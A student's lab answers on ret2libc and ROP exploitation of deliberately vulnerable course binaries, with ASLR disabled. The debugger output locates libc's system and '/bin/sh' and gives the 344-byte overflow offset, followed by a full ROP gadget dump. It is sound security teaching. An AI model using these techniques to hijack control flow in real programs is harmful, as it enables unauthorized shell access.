# Exercise 1

**Q1**: Where are these hundreds of functions?

**Answer**: In the libraries that we include.

**Q2**: Explore the program. What does it do? Where is the vulnerability?

**Answer**:

It asks user input for an unsinged integer (corresponding to the index of the airline company) and then for the user's name (array of char). Then it checks if the chosen airline is within the lists of *bookings*.

I have disabled ASLR so the addresses are not randomized, which means a quick inspection of the binary generated by running `make ex1` can give me details about the addresses of functions, variables and where are the sections of the binary located in the memory.

Since the user is prompted for input, we can use the buffer overflow attack.

**Q3**: How does ret2libc fit into this? What are some nice libc functions for exploitation?

**Answer**:

 Since there is no interesting function written by the programmer here that we can call to get a shell, we can use a function from the `libc` library to get a shell. Some nice libc functions that I can think of are `execve` (that we used in the last lab) and `system`.

**Q4**: Can we get a shell with this program? How?

**Answer**:

We can use the buffer overflow exploit and overwrite the return adress with the address of the `system` function from the `libc` library.

The address of the `system` function: `0x7ffff7c4b980` from:

```bash
pwndbg> info address system
Symbol "system" is at 0x7ffff7c4b980 in a file compiled without debugging.
```

The address of the `name` variable is `0x7fffffffd410`:

```bash
pwndbg> p &name
$1 = (char (*)[64]) c
```

How many bytes to overwrite until we get to overwrite the return address:

```bash
pwndbg> p (long)($rbp+8) - (long)(&name)
$5 = 344
```

Search for the string "/bin/sh" in `libc.so.6`:

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/aapostol/workspace/osds/lab3/bin/ex1
          0x401000           0x402000 r-xp     1000   1000 /home/aapostol/workspace/osds/lab3/bin/ex1
          0x402000           0x403000 r--p     1000   2000 /home/aapostol/workspace/osds/lab3/bin/ex1
          0x403000           0x404000 r--p     1000   2000 /home/aapostol/workspace/osds/lab3/bin/ex1
          0x404000           0x405000 rw-p     1000   3000 /home/aapostol/workspace/osds/lab3/bin/ex1
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib64/libc.so.6
    0x7ffff7c28000     0x7ffff7d9d000 r-xp   175000  28000 /usr/lib64/libc.so.6
    0x7ffff7d9d000     0x7ffff7df5000 r--p    58000 19d000 /usr/lib64/libc.so.6
    0x7ffff7df5000     0x7ffff7df9000 r--p     4000 1f5000 /usr/lib64/libc.so.6
    0x7ffff7df9000     0x7ffff7dfb000 rw-p     2000 1f9000 /usr/lib64/libc.so.6
    0x7ffff7dfb000     0x7ffff7e08000 rw-p     d000      0 [anon_7ffff7dfb]
    0x7ffff7fb5000     0x7ffff7fba000 rw-p     5000      0 [anon_7ffff7fb5]
    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000      0 [vvar]
    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000      0 [vdso]
    0x7ffff7fc7000     0x7ffff7fc9000 r--p     2000      0 /usr/lib64/ld-linux-x86-64.so.2
    0x7ffff7fc9000     0x7ffff7ff0000 r-xp    27000   2000 /usr/lib64/ld-linux-x86-64.so.2
    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000  29000 /usr/lib64/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  34000 /usr/lib64/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  36000 /usr/lib64/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> find 0x7ffff7c00000,0x7ffff7df9000,"/bin/sh"
0x7ffff7db8171
```

## Exercise 2


**Q5**:  Explore the program. What does it do? Where is the vulnerability?

**Answer**:

The program outputs a bunch of strings on the stdout.
It asks for user input.
Then calls `memcpy` to copy into `bad_nightmare` the whole of `souldream` (256 bytes). This could be a security risk.

**Q6**: Dump the ROP gadgets from the binary. Look at them and think which might be useful and why.

**Answer**: 

```bash
ROPgadget --binary ./bin/ex2 
Gadgets information
============================================================
0x0000000000401148 : adc ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401178 : add bh, al ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4011a7
0x00000000004010e3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x00000000004010ac : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040117c : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4011a7
0x00000000004011de : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4011f2
0x00000000004011ce : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401236
0x0000000000401308 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004010e4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040114a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010ae : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x000000000040117e : add byte ptr [rax], al ; jmp 0x4011a7
0x00000000004011e0 : add byte ptr [rax], al ; jmp 0x4011f2
0x00000000004011d0 : add byte ptr [rax], al ; jmp 0x401236
0x00000000004011d9 : add byte ptr [rax], al ; mov dword ptr [rbp - 0x2c], 0 ; jmp 0x4011f2
0x0000000000401177 : add byte ptr [rax], al ; mov dword ptr [rbp - 4], 0 ; jmp 0x4011a7
0x000000000040130a : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x00000000004010e6 : add byte ptr [rax], al ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004010d8 : add byte ptr [rax], al ; test rax, rax ; je 0x4010e8 ; jmp rax
0x0000000000401119 : add byte ptr [rax], al ; test rax, rax ; je 0x401128 ; jmp rax
0x0000000000401125 : add byte ptr [rax], r8b ; ret
0x000000000040114b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401118 : add byte ptr cs:[rax], al ; test rax, rax ; je 0x401128 ; jmp rax
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401147 : add eax, 0x2f13 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004012a8 : call qword ptr [rax + 0x4855c35d]
0x00000000004011bb : call qword ptr [rax + 0x4855c3c9]
0x0000000000401014 : call rax
0x000000000040117b : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4011a7
0x0000000000401163 : cli ; jmp 0x4010f0
0x00000000004010b3 : cli ; ret
0x0000000000401313 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401160 : endbr64 ; jmp 0x4010f0
0x00000000004010b0 : endbr64 ; ret
0x00000000004011ca : enter 0x45c7, -0x28 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401236
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010dd : je 0x4010e8 ; jmp rax
0x000000000040111e : je 0x401128 ; jmp rax
0x00000000004011c9 : jge 0x401193 ; mov dword ptr [rbp - 0x28], 0 ; jmp 0x401236
0x000000000040103b : jmp 0x401020
0x0000000000401164 : jmp 0x4010f0
0x0000000000401180 : jmp 0x4011a7
0x00000000004011e2 : jmp 0x4011f2
0x00000000004011d2 : jmp 0x401236
0x00000000004010df : jmp rax
0x0000000000401248 : jne 0x4011d4 ; nop ; nop ; pop rax ; pop rdx ; pop rsi ; pop rdi ; pop rbp ; ret
0x00000000004011bd : leave ; ret
0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040100b : loope 0x40103c ; add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x0000000000401121 : loopne 0x401189 ; nop dword ptr [rax + rax] ; ret
0x0000000000401146 : mov byte ptr [rip + 0x2f13], 1 ; pop rbp ; ret
0x0000000000401249 : mov dl, byte ptr [rax + 0x5e5a5890] ; pop rdi ; pop rbp ; ret
0x00000000004011cb : mov dword ptr [rbp - 0x28], 0 ; jmp 0x401236
0x00000000004011db : mov dword ptr [rbp - 0x2c], 0 ; jmp 0x4011f2
0x0000000000401179 : mov dword ptr [rbp - 4], 0 ; jmp 0x4011a7
0x0000000000401307 : mov eax, 0 ; pop rbp ; ret
0x00000000004011bc : nop ; leave ; ret
0x000000000040124a : nop ; nop ; pop rax ; pop rdx ; pop rsi ; pop rdi ; pop rbp ; ret
0x000000000040124b : nop ; pop rax ; pop rdx ; pop rsi ; pop rdi ; pop rbp ; ret
0x00000000004012a9 : nop ; pop rbp ; ret
0x000000000040114f : nop ; ret
0x0000000000401123 : nop dword ptr [rax + rax] ; ret
0x000000000040115c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010f0
0x00000000004010e1 : nop dword ptr [rax] ; ret
0x0000000000401122 : nop word ptr [rax + rax] ; ret
0x000000000040111f : or bh, bh ; loopne 0x401189 ; nop dword ptr [rax + rax] ; ret
0x000000000040124c : pop rax ; pop rdx ; pop rsi ; pop rdi ; pop rbp ; ret
0x000000000040114d : pop rbp ; ret
0x000000000040124f : pop rdi ; pop rbp ; ret
0x000000000040124d : pop rdx ; pop rsi ; pop rdi ; pop rbp ; ret
0x000000000040124e : pop rsi ; pop rdi ; pop rbp ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401066 : push 3 ; jmp 0x401020
0x0000000000401076 : push 4 ; jmp 0x401020
0x000000000040101a : ret
0x0000000000401072 : ret 0x2f
0x0000000000401191 : ret 0xce89
0x0000000000401062 : retf 0x2f
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401315 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401314 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010db : test eax, eax ; je 0x4010e8 ; jmp rax
0x000000000040111c : test eax, eax ; je 0x401128 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004010da : test rax, rax ; je 0x4010e8 ; jmp rax
0x000000000040111b : test rax, rax ; je 0x401128 ; jmp rax

Unique gadgets found: 105
```